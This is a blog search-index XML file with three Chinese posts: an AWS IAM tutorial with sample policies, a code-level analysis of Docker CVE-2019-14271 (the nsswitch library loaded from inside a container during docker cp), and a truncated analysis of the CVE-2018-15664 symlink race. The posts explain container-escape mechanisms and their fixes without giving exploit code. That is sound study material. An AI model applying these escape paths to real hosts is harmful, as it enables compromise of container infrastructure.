<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>IAM学习</title>
    <link href="/cllafrcob0001fout5p6c6t2v/"/>
    <url>/cllafrcob0001fout5p6c6t2v/</url>
    
    <content type="html"><![CDATA[<p>AWS Identity and Access Management (IAM) 是一种 Web 服务，可以帮助您安全地控制对 AWS 资源的访问。借助 IAM，可以集中管理控制用户可访问哪些 AWS 资源的权限。可以使用 IAM 来控制谁通过了身份验证（准许登录）并获得授权（拥有权限）来使用资源。</p><h2 id="IAM相关概念"><a href="#IAM相关概念" class="headerlink" title="IAM相关概念"></a>IAM相关概念</h2><p>Resources: IAM中的对象，如user,group,Role,Policy等<br>Identities: 被赋予policy的对象<br>Entities: 用来鉴权的对象<br>Principals:认证主体，可请求对 AWS 资源执行操作的人类用户或工作负载。在身份验证后，可以向主体授予永久或临时凭证，以允许其向 AWS 发出请求，具体取决于主体类型</p><h2 id="IAM工作流程简析"><a href="#IAM工作流程简析" class="headerlink" title="IAM工作流程简析"></a>IAM工作流程简析</h2><p>下图是aws官网提供的IAM工作原理图<br><img src="/.com//bVc89Oz"><br>当我们想要对某个资源进行某些操作时首先会经过Authentication阶段，该阶段主要是为了验证身份的合法性，即验证“你是谁”。当鉴权通过后，此次操作的请求会进入Authorization阶段，该阶段主要是为了验证操作的合法性，即验证“你有没有权限做这个操作”，该阶段会通过policy进行验证，在验证时依照以下几个原则进行检查：<br>    - 默认情况下，所有request都被拒绝<br>    - 被显式授权的操作才可以执行<br>    - 多个policy存在时只要有一个policy拒绝了某个操作，那么该操作就会被拒绝（拒绝优先级大于允许）<br>当Authorization阶段判定当前操作可以执行后会根据请求中的信息对相应的资源进行操作。</p><h2 id="IAM-policy"><a href="#IAM-policy" class="headerlink" title="IAM policy"></a>IAM policy</h2><p>上面提到，在Authorization阶段会使用policy进行验证，那么什么是policy呢？在AWS中，权限会通过policy的形式被赋予给用户&#x2F;组&#x2F;角色等，通常是以json形式存在的。通常情况下，AWS中有以下几种policy：</p><ol><li>identity-based policy： 赋予给用户&#x2F;组&#x2F;角色的policy，用来制定用户&#x2F;组&#x2F;角色可以进行哪些操作。</li><li>resource-based policy: 赋予给S3等资源的policy，用来制定某些用户可以对该资源进行什么样的操作</li><li>permissions boundaries： 针对identity-based policy，用来能够赋予给用户&#x2F;组&#x2F;角色的最大权限集合（对resource-based policy无效）</li><li>Organizations SCPs： 在组织中，对组织内部所有的账号设置可用的最大权限的集合</li><li>Access Control Lists：控制其他账号中的用户访问本账号资源的policy</li><li>session policy：当使用AWS CLI 或者AWS API时限制了用户&#x2F;角色传递给session的权限的最大集合</li></ol><p>该条policy为identity-based policy，表示可以对所有的S3资源进行只读操作，将这条规则赋予给用户&#x2F;组&#x2F;角色后，他们就可以对所有的S3资源进行只读操作</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;s3:Get*&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;s3:List*&quot;</span><br>      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>该条policy为resource-based policy，表示所有认证主体都可以对corp-fs-web-bucket下的所有资源进行读取操作</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::corp-fs-web-bucket/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>下面简单介绍一下IAM JSON策略语言的语法：<br>总体来说一个policy要包括以下三个部分：version_block,id_block,statement_block。</p><ol><li>version_block可选项，用于定义策略语言的版本，常用的有”2008-10-17”和“2012-10-17”</li><li>id_block可选项，用来表示policy的id，可以在resoucre-based policy中使用，不能在identity-based policy中使用</li><li>statement_block表示当前的policy中不同的权限语句，一个statement_block包括以下几部分：</li></ol><ul><li>sid_block： 可选项，用于区分不同的权限语句</li><li>principal_block： 可选项，用于指定权限语句赋予的认证主体，identity-based policy无需制定，因为该类规则被赋予给用户&#x2F;组&#x2F;角色时就隐式地制定了principal。resource-based policy需要指定</li><li>effect_block：表示允许还是拒绝该条操作，可选值包括ALLOW和DENY</li><li>action_block：表示该条权限语句影响的操作列表</li><li>resource_block：表示该条语句影响的资源列表</li><li>condition_block： 可选项，用于更加精细地控制用户究竟能访问资源下的哪些数据</li></ul><p>其中，resource_block部分需要使用ARN进行指定</p><h2 id="ARN"><a href="#ARN" class="headerlink" title="ARN"></a>ARN</h2><p>ARN（Amazon Resource Name）的格式如下：<br><code>arn:partition:service:region:account:resource</code><br>其中各个部分代表的含义为：</p><ul><li>partition 用于标识资源所在的分区。对于标准 AWS 区域，分区是 aws。如果资源位于其他分区，则分区是 aws-partitionname。例如，中国（北京）区域中的资源的分区为 aws-cn。您不能在不同分区的账户之间委派访问权限。</li><li>service 标识 AWS 产品。IAM 资源始终使用 iam。</li><li>region 标识资源的区域。对于 IAM 资源，它始终保持空白。</li><li>account 指定没有连字符的 AWS 账户 ID。</li><li>resource 按名称标识特定资源。</li></ul><p>示例：<br>    arn:aws:iam::account:root<br>    arn:aws:iam::account:user&#x2F;user-name-with-path<br>    arn:aws:iam::account:group&#x2F;group-name-with-path<br>    arn:aws:iam::account:role&#x2F;role-name-with-path<br>    arn:aws:iam::account:policy&#x2F;policy-name-with-path<br>    arn:aws:iam::account:instance-profile&#x2F;instance-profile-name-with-pat<br>由于IAM是全球资源，所以IAM的ARM的region部分为空<br>大多数情况下我们都会使用ARN指定一个资源，但是除了ARN意外，还可以使用资源的唯一ID进行指定。并且我们可以通过资源的唯一ID的前缀判断当前资源时哪一类资源：</p><table><thead><tr><th>前缀</th><th>资源类型</th></tr></thead><tbody><tr><td>ABIA</td><td>AWS STS 服务持有者令牌</td></tr><tr><td>ACCA</td><td>上下文特定凭证</td></tr><tr><td>AGPA</td><td>用户组</td></tr><tr><td>AIDA</td><td>IAM 用户</td></tr><tr><td>AIPA</td><td>Amazon EC2 实例配置文件</td></tr><tr><td>AKIA</td><td>访问密钥</td></tr><tr><td>ANPA</td><td>托管策略</td></tr><tr><td>ANVA</td><td>托管策略中的版本</td></tr><tr><td>APKA</td><td>公有密钥</td></tr><tr><td>AROA</td><td>角色</td></tr><tr><td>ASCA</td><td>证书</td></tr><tr><td>ASIA</td><td>临时 (AWS STS) 访问密钥 ID 使用此前缀，但仅在与秘密访问密钥和会话令牌结合使用时才具有唯一性。</td></tr></tbody></table><p> |</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-14271 docker cp漏洞分析</title>
    <link href="/cllafrcon0009fout7iwe18v0/"/>
    <url>/cllafrcon0009fout7iwe18v0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-14271-docker-cp漏洞分析"><a href="#CVE-2019-14271-docker-cp漏洞分析" class="headerlink" title="CVE-2019-14271 docker cp漏洞分析"></a>CVE-2019-14271 docker cp漏洞分析</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞是由于docker cp从不受信任的位置加载了动态库所导致的。当用户运行docker cp命令时，docker会调用docker-tar，docker-untar命令对文件进行打包。而在打包动作之前会先使用chroot进入容器内部。但非静态编译版本的docker在docker-tar的打包过程中会加载外部动态库，由于已经chroot进入了容器内部，所以此时会加载容器内部的动态库。攻击者可以通过替换容器内部的动态库进行攻击。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>下载docker源码，将源码切换到该cve未修复的某个commit处查看源码。<br>当用户使用docker cp命令时，docker client会向docker daemon提供的api接口发送请求。docker daemon接受到请求后会根据请求的不同进行打包和解包的操作。此漏洞出现在docker daemon打包的过程中。此处对docker daemon打包过程的代码简要分析：<br>当用户使用docker cp从容器中向宿主机中复制文件时，docker client会向docker daemon的”get &#x2F;containers&#x2F;(containerID)&#x2F;archive”接口发送请求，请求体包括打包的文件信息和容器的相关信息。docker daemon接受到请求后进入如下处理流程：（&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> tarArchive.Close()<br><br><span class="hljs-keyword">if</span> err := setContainerPathStatHeader(stat, w.Header()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>w.Header().Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-tar&quot;</span>)<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中<code>s.backend.ContainerArchivePath</code>函数经过一系列函数调用后会调用到<code>invokerPack</code>函数（&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">invokePack</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *archive.TarOptions, root <span class="hljs-type">string</span>)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br>cmd := reexec.Command(<span class="hljs-string">&quot;docker-tar&quot;</span>, relSrc, root)<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数使用reexec库调用了<code>docker-tar</code>命令对应的执行逻辑。在&#x2F;pkg&#x2F;chrootarchive&#x2F;init_unix.go的<code>init</code>函数中进行了docker-tar命令的注册：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>reexec.Register(<span class="hljs-string">&quot;docker-applyLayer&quot;</span>, applyLayer)<br>reexec.Register(<span class="hljs-string">&quot;docker-untar&quot;</span>, untar)<br>reexec.Register(<span class="hljs-string">&quot;docker-tar&quot;</span>, tar)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以此时程序会调用到<code>tar</code>函数(&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go)，该函数的具体处理逻辑为：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">tar</span><span class="hljs-params">()</span></span> &#123;<br>...<br><span class="hljs-keyword">if</span> err := realChroot(root); err != <span class="hljs-literal">nil</span> &#123;<br>fatal(err)<br>&#125;<br><br>...<br><br>rdr, err := archive.TarWithOptions(src, &amp;options)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>首先会通过<code>realChroot</code>函数进行chroot进入容器内部。（&#x2F;pkg&#x2F;chrootarchive&#x2F;chroot_linux.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">realChroot</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := unix.Chroot(path); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;Error after fallback to chroot: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := unix.Chdir(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;Error changing to new root after chroot: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用<code>TarWithOptions</code>函数进行文件打包操作（&#x2F;pkg&#x2F;archive&#x2F;archive.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TarWithOptions</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *TarOptions)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ta := newTarAppender(<br>idtools.NewIDMappingsFromMaps(options.UIDMaps, options.GIDMaps),<br>compressWriter,<br>options.ChownOpts,<br>)<br>...<br>       <span class="hljs-keyword">if</span> err = ta.addTarFile(filePath, relFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Errorf(<span class="hljs-string">&quot;Can&#x27;t add file %s to tar: %s&quot;</span>, filePath, err)<br><span class="hljs-comment">// if pipe is broken, stop writing tar stream to it</span><br><span class="hljs-keyword">if</span> err == io.ErrClosedPipe &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> pipeReader, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>TarWithOptions</code>函数会创建一个tarAppender对象，并调用其<code>addTarFile</code>函数将文件进行打包（&#x2F;pkg&#x2F;archive&#x2F;archive.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ta *tarAppender)</span></span> addTarFile(path, name <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>...<br>hdr, err := FileInfoHeader(name, fi, link)<br>...<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>addTarFile</code>函数使用<code>FileInfoHeader</code>函数根据文件信息和链接信息获取一个填充了更多信息的tar.Header。<code>FileInfoHeader</code>函数会调用到go标准库<code>archive/tar</code>中的<code>FileInfoHeader</code>函数（go&#x2F;libexec&#x2F;src&#x2F;archive&#x2F;tar&#x2F;common.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FileInfoHeader</span><span class="hljs-params">(fi fs.FileInfo, link <span class="hljs-type">string</span>)</span></span> (*Header, <span class="hljs-type">error</span>) &#123;<br>...<br>    <span class="hljs-keyword">if</span> sysStat != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> h, sysStat(fi, h)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过上述代码可以发现，当sysStat不为空时会调用到sysStat所代表的函数。而在go&#x2F;libexec&#x2F;src&#x2F;archive&#x2F;tar&#x2F;stat_unix.go的<code>init</code>函数中对sysStat进行了赋值：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>sysStat=statUnix<br>&#125;<br></code></pre></td></tr></table></figure><p>因此，我们会调用到<code>statUnix</code>函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">statUnix</span><span class="hljs-params">(fi fs.FileInfo, h *Header)</span></span> <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">if</span> u, ok := userMap.Load(h.Uid); ok &#123;<br>h.Uname = u.(<span class="hljs-type">string</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> u, err := user.LookupId(strconv.Itoa(h.Uid)); err == <span class="hljs-literal">nil</span> &#123;<br>h.Uname = u.Username<br>userMap.Store(h.Uid, h.Uname)<br>&#125;<br><span class="hljs-keyword">if</span> g, ok := groupMap.Load(h.Gid); ok &#123;<br>h.Gname = g.(<span class="hljs-type">string</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> g, err := user.LookupGroupId(strconv.Itoa(h.Gid)); err == <span class="hljs-literal">nil</span> &#123;<br>h.Gname = g.Name<br>groupMap.Store(h.Gid, h.Gname)<br>&#125;<br> ...<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在该函数中使用到了<code>user.LookupId</code>和<code>user.LookupGroupId</code>两个函数来获取用户和用户组信息。以LookupId为例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LookupId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> u, err := Current(); err == <span class="hljs-literal">nil</span> &amp;&amp; u.Uid == uid &#123;<br><span class="hljs-keyword">return</span> u, err<br>&#125;<br><span class="hljs-keyword">return</span> lookupUserId(uid)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUserId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">return</span> lookupUnixUid(i)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUserId</span><span class="hljs-params">(uid <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">return</span> lookupUnixUid(i)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lookupUnixUid</span><span class="hljs-params">(uid <span class="hljs-type">int</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br>...<br>err := retryWithBuffer(userBuffer, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(buf []<span class="hljs-type">byte</span>)</span></span> syscall.Errno &#123;<br><span class="hljs-keyword">var</span> errno syscall.Errno<br>pwd, found, errno = _C_getpwuid_r(_C_uid_t(uid),<br>(*_C_char)(unsafe.Pointer(&amp;buf[<span class="hljs-number">0</span>])), _C_size_t(<span class="hljs-built_in">len</span>(buf)))<br><span class="hljs-keyword">return</span> errno<br>&#125;)<br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> _<span class="hljs-title">C_getpwuid_r</span><span class="hljs-params">(uid _C_uid_t, buf *_C_char, size _C_size_t)</span></span> (pwd _C_struct_passwd, found <span class="hljs-type">bool</span>, errno syscall.Errno) &#123;<br><span class="hljs-keyword">var</span> f, e _C_int<br>pwd = C.mygetpwuid_r(_C_int(uid), buf, size, &amp;f, &amp;e)<br><span class="hljs-keyword">return</span> pwd, f != <span class="hljs-number">0</span>, syscall.Errno(e)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，此时会调用到<code>_C_getpwuid_r</code>函数。而该函数又会调用到cgo中的<code>mygetpwuid_r</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> passwd <span class="hljs-title function_">mygetpwuid_r</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buflen, <span class="hljs-type">int</span> *found, <span class="hljs-type">int</span> *perr)</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> <span class="hljs-title">pwd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">result</span>;</span><br><span class="hljs-built_in">memset</span> (&amp;pwd, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(pwd));<br>*perr = getpwuid_r(uid, &amp;pwd, buf, buflen, &amp;result);<br>*found = result != <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> pwd;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，使用了<code>getpwuid_r</code>函数。使用该函数需要加载nsswitch动态库，但此时已经通过relChroot函数chroot到了容器文件系统中，因此会从容器中动态加载nsswitch库。此时漏洞产生。<br>该漏洞出现过程中的函数调用链：<br><code>getContainersArchive</code>-&gt;<code>s.backend.ContainerArchivePath</code>-&gt;<code>...</code>-&gt;<code>invokerPack</code>-&gt;<code>tar</code>-&gt;<code>TarWithOptions</code>-&gt;<code>addTarFile</code>-&gt;<code>FileInfoHeader</code>-&gt;<code>tar.FileInfoHeader</code>-&gt;<code>statUnix</code>-&gt;<code>user.LookuoId</code>-&gt;<code>_C_getpwuid_r</code>-&gt;<code>C.mygetpwuid_r</code>-&gt;<code>getpwuid_r</code></p><h2 id="官方修复代码"><a href="#官方修复代码" class="headerlink" title="官方修复代码"></a>官方修复代码</h2><p>官方的修复代码的逻辑很简单，就是在chroot之前加载nsswitch动态库，这样就不会在不受信任的容器内部加载动态库了。<br><img src="/.com//bVc8Yxo" alt="截屏2023-07-25 11.26.27.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-15664符号链接替换漏洞分析</title>
    <link href="/cllafrcom0008fout2wpk1lhu/"/>
    <url>/cllafrcom0008fout2wpk1lhu/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-15664符号链接替换漏洞分析"><a href="#CVE-2018-15664符号链接替换漏洞分析" class="headerlink" title="CVE-2018-15664符号链接替换漏洞分析"></a>CVE-2018-15664符号链接替换漏洞分析</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Aleksa Sarai在2019年公布了一个docker的符号链接替换漏洞（cve-2018-15664）。该漏洞的成因是docker cp过程中会遭受到TOCTOU攻击。简单来讲就是docker在cp过程中的路径在被进行安全转换后并没有被立即使用，攻击者可以先使用一个合法文件进行安全转换，在转换后的路径被使用之前将其替换为一个带有恶意软链接的文件进行攻击。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>（git commit id : 20262688df290f1196c5620112488f6445b7eb26）<br>docker cp分为两类：从容器中向宿主机复制文件和从宿主机向容器中复制文件。本文以从容器中向宿主机复制文件为例简单从代码层面分析漏洞的成因。<br>当用户执行docker cp命令从容器中向宿主机复制文件时，docker client 会接受到用户输入的命令并进入下面的处理逻辑（&#x2F;cli&#x2F;command&#x2F;container&#x2F;cp.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><br><span 